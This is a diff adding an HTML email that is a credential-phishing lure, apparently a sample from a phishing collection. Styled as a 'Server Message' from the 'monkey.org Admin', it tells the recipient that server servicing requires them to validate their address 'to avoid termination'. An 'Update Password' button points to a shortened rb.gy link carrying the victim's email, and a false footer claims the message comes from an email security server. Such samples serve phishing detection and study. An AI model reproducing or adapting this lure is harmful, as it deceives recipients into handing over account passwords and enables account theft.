@@ -1,0 +1,53 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 11.00.10570.1001"></HEAD>
+<body style="MARGIN: 0.5em"><BR class=Apple-interchange-newline>
+<table style="BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: Arial, Tahoma, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,45,46); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial" cellspacing="0" width="100%">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#045fb4" height="110"><BR class=Apple-interchange-newline>
+<table style="BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width="80%" align="center">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box"><FONT style="BOX-SIZING: border-box" color=#ffffff size=+4 face=calibri>Server Message</FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8"><BR style="BOX-SIZING: border-box"><BR style="BOX-SIZING: border-box">
+<table style="BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width="80%" align="center">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box"><FONT style="BOX-SIZING: border-box" size=+2 face=calibri><STRONG style="BOX-SIZING: border-box; FONT-WEIGHT: bolder">Hello<SPAN style="BOX-SIZING: border-box">&nbsp;jose@monkey.org</SPAN></STRONG></FONT><BR style="BOX-SIZING: border-box"><BR style="BOX-SIZING: border-box"><FONT style="BOX-SIZING: border-box" size=3 face=calibri>We're currently undrgoing internal serviving on our server for fclbd.com.<BR style="BOX-SIZING: border-box">
+<BR style="BOX-SIZING: border-box">Kindly validate&nbsp;jose@monkey.org to avoid termination.</FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8" height="15"><BR style="BOX-SIZING: border-box"></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8">
+<table style="BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" height="60" width="80%" align="center" bgcolor="#045fb4">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box">
+<DIV style="BOX-SIZING: border-box; PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0px" align=center><A style="BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(0,105,166); BACKGROUND-COLOR: transparent" href="https://rb.gy/43wuw/#jose@monkey.org" rel=noreferrer target=_blank><FONT style="BOX-SIZING: border-box" color=#ffffff size=+2 face=calibri>Update Password</FONT></A></DIV></TD></TR></TBODY></TABLE></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8" height="20"><BR style="BOX-SIZING: border-box"></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8" height="70">
+<table style="BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width="80%" align="center">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box"><FONT style="BOX-SIZING: border-box" size=3 face=calibri>
+<P style="BOX-SIZING: border-box; MARGIN-TOP: 0px">Regards.<BR style="BOX-SIZING: border-box"><STRONG style="BOX-SIZING: border-box; FONT-WEIGHT: bolder">&nbsp;monkey.org Admin.</STRONG></P></FONT></TD></TR></TBODY></TABLE></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8">
+<table style="BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" height="10" width="80%" align="center">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box">
+<HR style="BORDER-LEFT-WIDTH: 0px; BOX-SIZING: content-box; OVERFLOW: visible; BORDER-TOP: 1px solid; HEIGHT: 0px; BORDER-RIGHT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-LEFT-COLOR: ; BORDER-BOTTOM-COLOR: ; BORDER-RIGHT-COLOR: ; border-image: initial" align=center width="100%">
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box" bgcolor="#f8f8f8">
+<table style="BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" width="80%" align="center">
+<TBODY style="BOX-SIZING: border-box">
+<TR style="BOX-SIZING: border-box">
+<td style="BOX-SIZING: border-box"><FONT style="BOX-SIZING: border-box" size=2 face=calibri>This message is auto-generated from the E-mail security server, and replies sent to this email can not be delivered.&nbsp;</FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
